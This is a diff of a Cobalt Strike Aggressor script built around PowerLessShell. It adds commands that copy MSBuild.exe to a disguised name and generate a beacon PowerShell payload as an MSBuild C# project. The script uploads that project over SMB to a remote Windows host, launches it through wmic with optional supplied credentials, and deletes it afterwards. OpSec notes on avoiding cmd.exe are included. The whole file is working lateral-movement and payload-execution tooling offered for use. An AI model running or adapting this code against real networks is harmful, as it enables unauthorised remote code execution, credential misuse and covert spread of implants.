@@ -1,15 +1,134 @@
-# # # Aggressor script to simplify using PowerLessShell with Cobalt Strike (https://github.com/Mr-Un1k0d3r/PowerLessShell) # Author: MrT-F
-# To use: load script. use macro "wmi_msbuild [target] [listener]" in beacon console
-#
-#
+######################################
+## PowerLessShell via Cobalt Strike ##
+######################################
+## Author: 		Alyssa (ramen0x3f)
+## OG Author: 		MrT-F 
+## Last Updated: 	2018-02-13
+## PowerLessShell: 	Mr-Un1k0d3r (https://github.com/Mr-Un1k0d3r/PowerLessShell) 
 
-#Register alias
-beacon_command_register("wmi_msbuild", "wmi lateral movement without powershell","Synopsis: wmi_msbuild [target] [listener]", "This uses Mr-Un1k0d3r's PowerLessShell (https://github.com/Mr-Un1k0d3r/PowerLessShell) to execute beacon's powershell payload on a remote system. You will need to copy the PowerLessShell repo to folder PowerLessShell in your cobaltstrike client directory (or edit the $pls_path variable here). Also, the PowerLessShell.py script assumes .NET framework 4.0.30319, so that must exist on the remote system. If it doesn't, edit the script ;)");
+#### Set Up ####
+# i. Either copy PowerLessShell folder to [cobalts working dir]/PowerLessShell or make note of path
+# ii. If you didn't copy it to the Cobalt directory: edit the $pls_path variable in this file to point to PowerLessShell
+# iii. Load script into Cobalt Strike
+
+#### Usage ####
+#check_msbuild -target TARGET   		Verify .NET 4.0.30319 is installed 
+#	[-user user] [-pass pass]		(should see "Status OK")
+#						Windows 7 has .NET 4.0.30319 after 3 reboots and 4 Windows update cycles
+
+#rename_msbuild -target TARGET 			Copy MSBuild.exe. 
+#	-msbuild newname 
+# 	[-path C:\new\path] 			Default - C:\Users\Public\
+#	[-user domain\username]			Specifying user/pass spawns cmd
+# 	[-pass password]			on remote host.
+
+#wmi_msbuild -target TARGET 		 	Spawn new beacon. 
+#	-listener LISTENER
+#	[-payload new_file]		 	Default - [a-zA-Z].tmp
+#	[-directory new_dir]			Default - C:\Users\Public\
+#	[-msbuild alt_msbuild_location] 	
+#	[-user USERNAME] [-pass PASSWORD]	
+#	[-manualdelete]				Switch doesn't auto delete payload.
+
+#### OpSec Notes ####
+# Spawns cmd.exe on the target system if
+# - ManualDelete switch is not set
+# - rename_msbuild is run with a username/password specified
+
+#### Register aliases ####
+beacon_command_register("check_msbuild", 
+		"Look for .NET v4.0.30319 on target",
+		"Synopsis: check_msbuild -target TARGET [-user user] [-pass pass]", 
+		"This checks a remote system for .NET v4.0.30319 and responds with a 'Status OK' if MSBuild.exe is there. User/pass to authenticate with remotely are optional. NOTE: Uses cmd.exe. User must be local admin on target.");
+
+beacon_command_register("rename_msbuild", 
+		"Create innocent looking copy of MSBuild.exe",
+		"Synopsis: rename_msbuild -target TARGET -msbuild [newname] [-path C:\new\path] [-user username] [-pass password]", 
+		"This copies MSBuild.exe to C:\Users\Public by default.");
+
+beacon_command_register("wmi_msbuild", 
+		"wmi lateral movement without powershell",
+		"Synopsis: wmi_msbuild -target TARGET -listener LISTENER [-payload new_filename] [-directory new_dir] [-msbuild alt_msbuild_location] [-user USERNAME] [-pass PASSWORD] [-manualdelete]", 
+		"This uses Mr-Un1k0d3r's PowerLessShell (https://github.com/Mr-Un1k0d3r/PowerLessShell) to execute beacon's powershell payload on a remote system. You will need to copy the PowerLessShell repo to folder PowerLessShell in your cobaltstrike client directory (or edit the $pls_path variable here). Also, the PowerLessShell.py script assumes .NET framework 4.0.30319, so that must exist on the remote system. If it doesn't, do 3 reboots and 4 Windows update cycles. No srsly.");
+
+global('$working_dir');
+$working_dir = "C$\\Users\\Public\\";
+
+#########
+# UTILS #
+#########
+sub parse_args {
+	# Description #
+	###############
+	## Add arguments and switches to your function 
+	## instead of everything being positional and sketchy.
+	#  Arguments  #
+	###############
+	## 1	Array of arguments from your initial function
+	
+	local('%args $get_val @to_check $bid');
+
+	if ( @_[0][0] in beacon_ids() ) {
+		$bid = @_[0][0];
+		@to_check = sublist(@_[0], 1); #Excludes the $bid
+	}
+	else {
+		@to_check = @_[0];
+	}
+	
+	foreach $a (@to_check) {
+		if( (charAt($a,0) cmp "-") == 0 ) { #Create keys for args
+			$get_val = substr($a, 1);
+			%args[$get_val] = true; #Treat like a switch by default
+		}
+		else if( $get_val ) { #Save value of key
+			%args[$get_val] = $a;
+			$get_val = $null;
+		}
+		else if ( $bid ) {  #Print to beacon if command was run from beacon
+			berror($1, "Something went wrong processing: " . $a);
+		}
+		else { #Print to script console if command was run from script console
+			println("Something went wrong processing: " . $a);
+		}
+	}
+
+	return %args;
+}
+
+sub gen_cs {
+	local('$handle');	
+	$handle	= exec("python PowerLessShell.py payload.ps1 payload.cs powershell", $null, cwd());
+	if (checkError($error)) {
+		warn($error);
+	}
+	#wait for generation to finish
+	wait($handle);
+	closef($handle);
+}
+
+sub gen_payload {
+	local('$ps1 $pls_path $handle');
+	$ps1 = artifact($1, "powershell", true, "x86");
+	#Change this to the path of PowerLessShell (relative to cobaltstrike dir, or just absolute)
+	$pls_path = "PowerLessShell";
+	chdir($pls_path);
+	if (checkError($error)) {
+		warn($error);
+	}
+	$handle = openf(">payload.ps1");
+	writeb($handle, $ps1);
+	if (checkError($error)) {
+		warn($error);
+	}
+	closef($handle);
+}
 
 sub gen_random_name {
 	#returns random filename .TMP
 	local('@alphabet $len $i $filename');
 	@alphabet = @("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z");
+	
 	#Random filename length between 5 and 16
 	$len = rand(11) + 5;	
 	for($i = 0; $i < $len; $i++){
@@ -19,88 +138,217 @@ sub gen_random_name {
 	return $filename;
 }
 
-sub gen_payload {
-	local('$ps1 $pls_path $handle');
-	$ps1 = artifact($1, "powershell", true, "x86");
-	#Change this to the path of PowerLessShell (relative to cobaltstrike dir, or just absolute)
-	$pls_path = "PowerLessShell";
-	chdir($pls_path);
-	if (checkError($error))
-	{
-		warn($error);
+sub hide {
+	# Arguments #
+	#############
+	## 2 	target
+	## 3	name to copy MSBuild.exe to
+	## 4	new working directory
+	## 5	opt: user
+	## 6 	opt: pass
+
+	if ( $5 && $6 ) {
+		bshell($1, "wmic /node:" . $2 . " /user:'" . $5 . "' /password:'" . $6 . "' process call create \"cmd /c copy /y C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe " . $4 . $3 . "\"");
 	}
-	$handle = openf(">payload.ps1");
-	writeb($handle, $ps1);
-	if (checkError($error))
-	{
-		warn($error);
+	else {
+		bcp($1, '\\\\' . $2 . '\\C$\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe', '\'\\\\' . $2 . '\\' . $4 . $3 .'\'');
 	}
-	closef($handle);
+
+	
+	blog($1, "Copied MSBuild.exe to " . $4 . $3);
 }
 
-sub gen_cs {
-	local('$handle');	
-	$handle	= exec("python PowerLessShell.py", $null, cwd());
-	if (checkError($error))
-	{
-		warn($error);
-	}
-	#stdin to name files
-	writeb($handle,"payload.ps1\n");
-	writeb($handle,"payload.cs\n");
-	#wait for generation to finish
-	wait($handle);
-	closef($handle);
-}
+sub msbuild {
+	# Arguments #
+	#############
+	## target 	- 	required
+	## listener 	- 	required
+	## user 	- 	optional
+	## pass 	- 	optional
+	## msbuild 	- 	optional, location of alternate msbuild
+	## payload 	- 	optional, new filename for payload
+	## manualdelete -	optional, switch, doesn't use cmd/auto delete payload
 
-sub wmi_msbuild_func {
-	local('$owd $ps1 $handle $payload $command_line $filename');
-	#save working dir to restore later
+	local('$cwd $owd $msbuild $ps1 $handle $payload $command_line $pay_dir $run_as %args');
+	%args = $2; 
+
+	#Save working dir to restore later
 	$owd = cwd();
-	#ensure listener exists
-	if (listener_info($3) is $null) {
-        	berror($1, "Listener $3 does not exist");
-        	return;
-   	}	
+	$cwd = $working_dir;
 
-	btask($1, "Tasked Beacon to spawn to $2 (" . listener_describe($3, $2) . ") via PowerLessShell");
-	#write payload to disk - i re-do this every time in case the listener changes. Probably could be more efficient
-	gen_payload($3);
+	#############
+	# User/Pass #
+	#############
+	if ( 'user' in %args && 'pass' in %args ) {
+		blog($1, "Specifiying user: " . %args['user'] . " w/ pass: " . %args['pass']);
+		$runas = ' /user:"' . %args['user'] . '" /password:"' . %args['pass'] . '" ';
+	}
+	else {
+		$runas = "";
+	}
+
+	############
+	# Listener #
+	############
+	#Ensure listener exists
+	if (%args['listener'] !in listeners_local()) {
+    	berror($1, "Listener " . %args['listener'] . " does not exist");
+    	return;
+   	}
+
+	###############
+	# MSBuild.exe #
+	###############
+   	if ( 'msbuild' in %args ) {
+   		$msbuild =  %args['msbuild'];
+   	}
+   	else {
+   		$msbuild = 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe';
+   	}
+
+   	blog($1, "Using MSBuild.exe in: " . $msbuild);
+	btask($1, "Tasked Beacon to spawn to " . %args['target'] . "(" . listener_describe(%args['listener'], %args['target']) . ") via PowerLessShell");
+
+	###########
+	# Payload #
+	###########
+	#Write payload to disk
+	#i re-do this every time in case the listener changes. Probably could be more efficient
+	gen_payload(%args['listener']);
+	
 	#Use PowerLessShell.py to generate .CS files    
 	gen_cs();
+	
 	#payload.cs.cmd has some nice obfuscation, but we are just going to upload cs file via smb and execute it for now. There are length issues...
 	$handle = openf("payload.cs");	
-	if (checkError($error))
-	{
+	if (checkError($error)) {
 		warn($error);
 	}
+	
 	$payload = readb($handle, -1);
-	if (checkError($error))
-	{
+	if (checkError($error)) {
 		warn($error);
 	}
 	closef($handle);	
-	$filename = gen_random_name();
-	bupload_raw($1,'\\\\'.$2.'\\C$\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\'.$filename,$payload);
-	#Built command line and execute - i  spawn cmd rather than directly calling msbuild so we can delete the file when beacon exits (less sneaky, but less cleanup at end of engagement)
-	$command_line = 'wmic /node:"';
-	$command_line .= $2;
-	$command_line .= '" process call create "cmd /c cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319 && MSBuild.exe ';
-	$command_line .= $filename.' && del '.$filename.'"';
-	println($command_line);
+	
+	#generate random payload name if not specified
+	if ( 'payload' in %args ) {
+		$filename = %args['payload'];
+	}
+	else {
+		$filename = gen_random_name();
+	}
 
-	#Run with beacon's "execute" 
-	bexecute!($1, $command_line);
-	#in case of smb listener, this will link
-	bstage($1, $2, $3);
-	#restore working dir
+	#use new directory if specified
+	if ( 'directory' in %args ) {
+		$pay_dir = %args['directory'];
+		if ( (charAt($pay_dir, -1) cmp "\\") != 0) {
+			$pay_dir = $pay_dir . "\\";
+		}
+	}
+	else {
+		$pay_dir = $working_dir;
+	}
+
+	#upload
+	bupload_raw($1,'\\\\'. %args['target'] . '\\' . strrep($pay_dir, ":", "$") . $filename , $payload);
+
+	##########
+	# Launch #
+	##########
+	## 1 - If ManualDelete, do all through WMIC (just launch)
+	if ( "manualdelete" in filter({return lc($1);}, keys(%args)) ) {
+		bshell($1, 'wmic /node:"' . %args['target'] . '" process call create "' . $msbuild . ' ' . strrep($pay_dir, "$", ":") . $filename . ' /noconsolelogger"');
+	}
+	## 2 - Else, do all through WMIC/CMD
+	else {
+		bshell($1, 'wmic /node:"' . %args['target'] . '"' . $runas . ' process call create "cmd /c ' . $msbuild . ' ' . strrep($pay_dir, "$", ":") . $filename . ' /noconsolelogger && del ' . strrep($pay_dir, "$", ":") . $filename . '"');
+	}
+
+	## Link SMB listener
+	bstage($1, %args['target'], %args['listener']);
+	
+	## Restore Originals
 	chdir($owd);
-
 }
 
-#alias definition so we can just run this in console
+###########
+# ALIASES #
+###########
+alias check_msbuild { #> Careful this uses "cmd.exe /c"
+	# Arguments #
+	#############
+	## target 	- 	required
+	## user 	- 	optional
+	## pass 	- 	optional
+
+	%args = %();
+
+	if ( len(@_) == 2 ) {
+		%args['target'] = $2;
+	}
+	else {
+		%args = parse_args(@_);
+		if ( "target" !in %args ) {
+			berror($1, "Missing required arguments. Please review what you provided.")
+			berror($1, "Example: check_msbuild 192.168.0.1");
+			berror($1, "Example: check_msbuild -target 192.168.0.1 [-user admin] [-pass password]");
+		}
+	}
+
+	blog($1, "Checking for existence of MSBuild.exe v4.0.30319 on " . %args['target']);
+	if ("user" in %args && "pass" in %args) { 
+		bshell($1, "wmic /node:" . %args['target'] . " /user:'" . %args['user'] . "' /password:'" . %args['pass'] . "' datafile where name=\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\MSBuild.exe\" get Status");
+	}
+	else {
+		bshell($1, "wmic /node:" . %args['target'] . " datafile where name=\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\MSBuild.exe\" get Status");
+	}
+}
+
+alias rename_msbuild {
+	# Arguments #
+	#############
+	## $2	target
+	## $3 	name to copy MSBuild.exe to
+	## $4 	(opt) new directory
+
+	%args = %();
+
+	%args = parse_args(@_);
+	if ( "target" !in %args ) {
+		berror($1, "Missing required arguments. Please review what you provided.")
+		berror($1, "Example: rename_msbuild -target 192.168.0.1 -msbuild acrord32.exe [-path C:\\Users\\Public\\Downloads\\] [-user admin] [-pass password]");
+	}
+	else {
+		if ( 'path' in %args ) {
+			hide($1, %args['target'], %args['msbuild'], %args['path'], %args['user'], %args['pass']);
+		}
+		else {
+			hide($1, %args['target'], %args['msbuild'], strrep($working_dir, "$", ":"), %args['user'], %args['pass']);
+		}
+	}
+}
+
 alias wmi_msbuild {
+	# Arguments #
+	#############
+	## target 	- 	required
+	## listener 	- 	required
+	## user 	- 	optional
+	## pass 	- 	optional
+	## msbuild 	- 	optional, location of alternate msbuild
+	## payload 	- 	optional, new filename for payload
+	## directory	-	optional, new location for payload (Default C:\Users\Public)
+	## manualdelete -	optional, switch, doesn't use cmd/auto delete payload
 
-	wmi_msbuild_func($1, $2, $3);
+	%args = parse_args(@_);
 
+	#See if required arguments were given
+	if ( "target" in %args && "listener" in %args ) {
+		msbuild($1, %args);
+	}
+	else {
+		berror($1, "Missing required arguments. Please review what you provided.");
+		berror($1, "Example: wmi_msbuild -target 192.168.0.1 -listener Default [-user admin] [-pass password] [-payload new_filename] [-msbuild alt_msbuild] [-directory new_dir] [-manualdelete]");
+	}
 }
